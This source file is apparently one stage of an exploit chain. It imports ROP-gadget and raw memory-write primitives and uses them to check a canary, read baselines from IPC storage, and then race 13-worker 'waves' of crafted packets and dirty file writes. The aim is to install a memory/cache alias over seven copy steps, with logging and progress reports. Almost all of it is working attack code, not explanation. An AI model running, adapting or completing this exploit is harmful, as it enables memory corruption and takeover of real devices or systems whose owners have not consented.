import coreRuntime from "../runtime.mjs";

const {GADGET_MEMSET: GADGET_MEMSET, allocPage: allocPage, call_rop: call_rop, closeReservationGroup: closeReservationGroup, executeWave: executeWave, frameArgSlot: frameArgSlot, ipcStorageRead: ipcStorageRead, log: log, openContentStorage: openContentStorage, openReservationGroup: openReservationGroup, prepPacket: prepPacket, readAllocationCounters: readAllocationCounters, resetWaveState: resetWaveState, roleSendCode: roleSendCode, write32: write32, write64: write64, write8: write8, writeDirtyData: writeDirtyData} = coreRuntime;

export async function preparePostCanaryCandidate({config: config, helpers: helpers, canaryQualified: canaryQualified, pktBuf: pktBuf, rootSession: rootSession, storageHandle: storageHandle, workerStateSafe: workerStateSafe}) {
    let candidateHandle = 0;
    let primeHex;
    let failureReason = null;
    var controlHex = "";
    var aliasControlHex = "";
    primeHex = "";
    var allocCost = null;
    if (canaryQualified && workerStateSafe) {
        var controlBuf = allocPage(config.CONTROL_SIZE + 8192);
        call_rop(GADGET_MEMSET, controlBuf, 0xA5n, BigInt(config.CONTROL_SIZE));
        var controlRead = ipcStorageRead(storageHandle, 0, config.CONTROL_SIZE, controlBuf);
        if (controlRead.error === 0) controlHex = helpers.readHexBytes(controlBuf, 16);
        var aliasBuf = allocPage(4096);
        call_rop(GADGET_MEMSET, aliasBuf, 0xA5n, 16n);
        var aliasRead = ipcStorageRead(storageHandle, config.ALIAS_OFFSET, 16, aliasBuf);
        if (aliasRead.error === 0) aliasControlHex = helpers.readHexBytes(aliasBuf, 16);
        var offsetsDistinct = controlHex && aliasControlHex && controlHex !== aliasControlHex;
        if (!offsetsDistinct) {
            failureReason = !controlHex || !aliasControlHex ? "baseline-control-read-failed" : "baseline-offsets-not-distinct";
            await log("BASELINE: FAIL offsets not distinct");
            canaryQualified = false;
        }
    }
    if (canaryQualified && workerStateSafe) {
        var countersBefore = readAllocationCounters(rootSession, pktBuf);
        var beforeHeap = countersBefore ? countersBefore[5] : null;
        candidateHandle = openContentStorage(rootSession);
        if (!candidateHandle) {
            failureReason = "candidate-storage-open-failed";
            await log("BASELINE: FAIL candidateHandle");
        } else {
            var countersAfter = readAllocationCounters(rootSession, pktBuf);
            var afterHeap = countersAfter ? countersAfter[5] : null;
            allocCost = beforeHeap !== null && afterHeap !== null ? beforeHeap - afterHeap : null;
            var primeBuf = allocPage(4096);
            call_rop(GADGET_MEMSET, primeBuf, 0xA5n, 16n);
            var primeRead = ipcStorageRead(candidateHandle, 0, 16, primeBuf);
            if (primeRead.error === 0) primeHex = helpers.readHexBytes(primeBuf, 16);
            var primeMatchesControl = primeHex && primeHex === controlHex;
            if (!primeHex) failureReason = "candidate-prime-read-failed"; else if (!primeMatchesControl) failureReason = "candidate-prime-mismatch";
            await log("BASELINE: " + (primeMatchesControl ? "OK" : "FAIL") + " alloc=" + (allocCost !== null ? allocCost + "B" : "N/A") + (primeMatchesControl ? "" : " PRIME-MISMATCH"));
        }
    }
    if (!workerStateSafe) failureReason = "worker-state-unsafe"; else if (!failureReason && !canaryQualified) failureReason = "canary-not-qualified"; else if (!failureReason && !candidateHandle) failureReason = "candidate-storage-open-failed"; else if (!failureReason && !primeHex) failureReason = "candidate-prime-read-failed";
    return {
        ok: true,
        canaryQualified: canaryQualified,
        candidateHandle: candidateHandle,
        primeHex: primeHex,
        aliasControlHex: aliasControlHex,
        failureReason: failureReason
    };
}

export async function installCacheAlias({config: config, helpers: helpers, REQ: REQ, canaryQualified: canaryQualified, candidateHandle: candidateHandle, dirtyFilePath: dirtyFilePath, dirtyWriteBuf: dirtyWriteBuf, dirtyWritePkt: dirtyWritePkt, gates: gates, pinPkt: pinPkt, pktBuf: pktBuf, primeHex: primeHex, rawScheduling: rawScheduling, rootSession: rootSession, savedHandle: savedHandle, sendIndices: sendIndices, triggerHandle: triggerHandle, waveData: waveData, waveExtra: waveExtra, wavesJoined: wavesJoined, wavesStarted: wavesStarted, workerResources: workerResources, workerStateSafe: workerStateSafe, fragmentBufs: fragmentBufs, triggerBuf: triggerBuf, clearPkt: clearPkt, clearSendIndex: clearSendIndex, pinFirstWaveQualified: pinFirstWaveQualified, pinHandle: pinHandle, pinSendIndex: pinSendIndex, prePkt: prePkt, preSendIndex: preSendIndex, abortControlCanonical: abortControlCanonical, canaryPath: canaryPath, setupPath: setupPath, setupPkt: setupPkt, reportProgress: reportProgress = null}) {
    let aliasInstalled;
    let candidateCacheNeedsRetirement = false;
    let copyStepsCompleted;
    let copyWavesTotal;
    let copyFailureReason;
    let copyStepFailures;
    let copyFailureCounts;
    aliasInstalled = false;
    copyWavesTotal = 0;
    copyStepsCompleted = 0;
    copyFailureReason = null;
    copyStepFailures = [];
    copyFailureCounts = Object.create(null);
    var noteCopyFailure = function(reason) {
        copyFailureCounts[reason] = (copyFailureCounts[reason] || 0) + 1;
    };
    if (!canaryQualified) copyFailureReason = "canary-not-qualified"; else if (!workerStateSafe) copyFailureReason = "worker-state-unsafe"; else if (!candidateHandle) copyFailureReason = "candidate-storage-unavailable"; else if (!primeHex) copyFailureReason = "candidate-prime-read-unavailable";
    if (canaryQualified && workerStateSafe && candidateHandle && primeHex) {
        var leakPrefix = config.CACHE_ALIAS_PREFIX.slice();
        var steps = helpers.nulWrites(leakPrefix);
        if (steps.length !== 7) {
            copyFailureReason = "invalid-copy-plan";
            noteCopyFailure("invalid-copy-plan");
            await log("ALIAS: FAIL nulWrites=" + steps.length + " (expect 7)");
        } else {
            var allStepsOk = true;
            candidateCacheNeedsRetirement = true;
            for (var stepIdx = 0; stepIdx < steps.length; stepIdx++) {
                var step = steps[stepIdx];
                var stepConfirmed = false;
                var stepAttempts = 0;
                var stepWindowFail = 0;
                var stepPreLow = 0;
                var stepPathMiss = 0;
                var stepHardFailure = null;
                var stepProgressReported = false;
                var stepProgressThreshold = Math.ceil(config.MAX_COPY_ATTEMPTS * config.COPY_BATCHES / 2);
                for (var batch = 0; batch < config.COPY_BATCHES && !stepConfirmed; batch++) {
                    for (var ca = 0; ca < config.MAX_COPY_ATTEMPTS; ca++) {
                        stepAttempts++;
                        if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE, dirtyWriteBuf, dirtyWritePkt)) {
                            stepHardFailure = "dirty-write-failed";
                            noteCopyFailure(stepHardFailure);
                            await log("FAIL: step " + stepIdx + " dirty write");
                            allStepsOk = false;
                            break;
                        }
                        resetWaveState(waveData.frames, waveData.backups, REQ, waveData.pktBackups, gates, waveExtra);
                        var payloadSetup = helpers.configurePayload(step.bytes, {
                            config: config,
                            REQ: REQ,
                            fragmentBufs: fragmentBufs,
                            triggerBuf: triggerBuf
                        });
                        if (!payloadSetup.configured) {
                            stepHardFailure = "payload-setup-failed";
                            noteCopyFailure(stepHardFailure);
                            allStepsOk = false;
                            break;
                        }
                        var group = openReservationGroup(rootSession, pktBuf, 59);
                        if (!group.ok) {
                            stepHardFailure = "reservation-failed";
                            noteCopyFailure(stepHardFailure);
                            await log("FAIL: step " + stepIdx + " reservation");
                            allStepsOk = false;
                            break;
                        }
                        prepPacket(REQ[9], 4, 8, []);
                        write8(REQ[9] + 0x10n, 2n);
                        write32(REQ[9] + 0x14n, BigInt(group.outer));
                        write32(REQ[9] + 0x1Cn, 0n);
                        write64(frameArgSlot(waveData.frames[9].frame, waveData.frames[9].count, sendIndices[9], 0), BigInt(group.session));
                        write64(frameArgSlot(waveData.frames[12].frame, waveData.frames[12].count, sendIndices[12], 0), BigInt(triggerHandle));
                        write32(pinPkt + 0x18n, 1009n);
                        var wave = executeWave(waveData.frames, rawScheduling, workerResources, gates, sendIndices);
                        wavesStarted += wave.started === 13 ? 1 : 0;
                        if (wave.created < 13 || wave.started < 13) {
                            var relCode = roleSendCode(waveData.frames, 9, sendIndices[9]);
                            closeReservationGroup(group, wave.created < 13 || relCode !== 0, pktBuf);
                            stepHardFailure = "worker-start-failed";
                            noteCopyFailure(stepHardFailure);
                            await log("FAIL: step " + stepIdx + " workers=" + wave.created + "/" + wave.started);
                            workerStateSafe = wave.workerStateSafe === true;
                            allStepsOk = false;
                            break;
                        }
                        if (wave.joined < 13) {
                            workerStateSafe = false;
                            stepHardFailure = "worker-join-failed";
                            noteCopyFailure(stepHardFailure);
                            allStepsOk = false;
                            break;
                        }
                        wavesJoined++;
                        var wResult = helpers.analyzeWave("cache-" + stepIdx, wave, waveData, group, false, {
                            config: config,
                            REQ: REQ,
                            clearPkt: clearPkt,
                            clearSendIndex: clearSendIndex,
                            gates: gates,
                            pinFirstWaveQualified: pinFirstWaveQualified,
                            pinHandle: pinHandle,
                            pinPkt: pinPkt,
                            pinSendIndex: pinSendIndex,
                            pktBuf: pktBuf,
                            prePkt: prePkt,
                            preSendIndex: preSendIndex,
                            rootSession: rootSession,
                            sendIndices: sendIndices,
                            abortControlCanonical: abortControlCanonical,
                            canaryPath: canaryPath,
                            savedHandle: savedHandle,
                            setupPath: setupPath,
                            setupPkt: setupPkt
                        });
                        var releaseWasSent = roleSendCode(waveData.frames, 9, sendIndices[9]) === 0;
                        closeReservationGroup(group, !releaseWasSent, pktBuf);
                        copyWavesTotal++;
                        var accepted = wResult.window && wResult.preReleaseUsed !== null && wResult.preReleaseUsed >= config.FIELD_MINIMUM_CACHE_HELD && wResult.changedPaths.length === 0;
                        if (reportProgress && accepted) {
                            await reportProgress("Memory alias progress: copy step " + (stepIdx + 1) + "/" + steps.length + " complete after " + copyWavesTotal + " waves.");
                        } else if (reportProgress && !stepProgressReported && stepAttempts >= stepProgressThreshold) {
                            await reportProgress("Memory alias progress: copy step " + (stepIdx + 1) + "/" + steps.length + " is still searching after " + stepAttempts + "/" + config.MAX_COPY_ATTEMPTS * config.COPY_BATCHES + " waves.");
                            stepProgressReported = true;
                        }
                        await log(helpers.formatWaveSummaryLine(copyWavesTotal, "cache-" + stepIdx, wResult, accepted ? "copy-ok" : "copy-rejected", {
                            config: config
                        }));
                        if (!accepted) {
                            if (!wResult.window) {
                                stepWindowFail++;
                                noteCopyFailure("window-not-qualified");
                            } else if (wResult.preReleaseUsed === null || wResult.preReleaseUsed < config.FIELD_MINIMUM_CACHE_HELD) {
                                stepPreLow++;
                                noteCopyFailure("pre-release-below-minimum");
                            } else if (wResult.changedPaths.length > 0) {
                                stepPathMiss++;
                                noteCopyFailure("path-mismatch");
                            }
                        }
                        if (accepted) {
                            candidateCacheNeedsRetirement = true;
                            stepConfirmed = true;
                            break;
                        }
                    }
                }
                if (!allStepsOk || !stepConfirmed) {
                    var stepFailureReason = stepHardFailure || "";
                    if (!stepFailureReason && stepWindowFail) {
                        stepFailureReason = "window-not-qualified";
                    } else if (!stepFailureReason && stepPreLow) {
                        stepFailureReason = "pre-release-below-minimum";
                    } else if (!stepFailureReason && stepPathMiss) {
                        stepFailureReason = "path-mismatch";
                    } else if (!stepFailureReason) {
                        stepFailureReason = "copy-attempts-exhausted";
                    }
                    if (!stepHardFailure) noteCopyFailure("copy-attempts-exhausted");
                    copyFailureReason = stepFailureReason;
                    copyStepFailures.push({
                        step: stepIdx + 1,
                        attempts: stepAttempts,
                        windowRejects: stepWindowFail,
                        preReleaseRejects: stepPreLow,
                        pathMismatches: stepPathMiss,
                        reason: stepFailureReason
                    });
                    await log("  step " + stepIdx + " FAIL att=" + stepAttempts + " winFail=" + stepWindowFail + " preLow=" + stepPreLow + " pathMiss=" + stepPathMiss);
                    allStepsOk = false;
                    break;
                }
                copyStepsCompleted++;
                await log("  step " + stepIdx + " OK (att=" + stepAttempts + ")");
            }
            aliasInstalled = allStepsOk;
        }
        await log("ALIAS: " + (aliasInstalled ? "OK" : "FAIL") + " " + copyStepsCompleted + "/7 steps (" + copyWavesTotal + " waves)");
    }
    return {
        ok: true,
        aliasInstalled: aliasInstalled,
        candidateCacheNeedsRetirement: candidateCacheNeedsRetirement,
        copyStepsCompleted: copyStepsCompleted,
        copyWavesTotal: copyWavesTotal,
        copyFailureReason: copyFailureReason,
        copyFailureCounts: copyFailureCounts,
        copyStepFailures: copyStepFailures,
        wavesJoined: wavesJoined,
        wavesStarted: wavesStarted,
        workerStateSafe: workerStateSafe
    };
}
